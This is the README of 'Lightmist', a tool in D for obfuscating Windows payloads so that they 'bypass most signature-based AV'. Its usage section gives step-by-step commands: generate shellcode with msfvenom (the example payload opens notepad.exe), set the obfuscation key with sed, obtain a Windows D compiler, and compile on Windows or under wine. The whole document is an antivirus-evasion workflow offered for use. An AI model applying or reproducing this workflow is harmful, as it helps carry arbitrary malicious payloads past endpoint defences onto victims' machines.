=========
Lightmist
=========

Basic windows payload obfuscation in D. This should bypass most
signature-based AV without issue.

Usage
-----

1) Generate a shellcode, for example with msfvenom, in the `payload` file

.. code:: bash

    $ msfvenom -p windows/exec CMD=notepad.exe > payload

2) Modify the key in lightmist.d

.. code:: bash

    $ sed -i '/KEY/s/Some random string/Some other key/' lightmist.d

3) Get a windows D compiler from
   http://downloads.dlang.org/releases/2.x/2.094.1/dmd.2.094.1.windows.7z

4) Compile (make sure to choose an architecture compatible with your payload)

.. code:: bash

    # From Windows
    $ dmd.exe -m32 -J=%cd% lightmist.d

    # From Linux

    $ WINEPATH="$(winepath -w "dmd2/windows/bin")" \
        wine dmd.exe -m32 -J=. lightmist.d
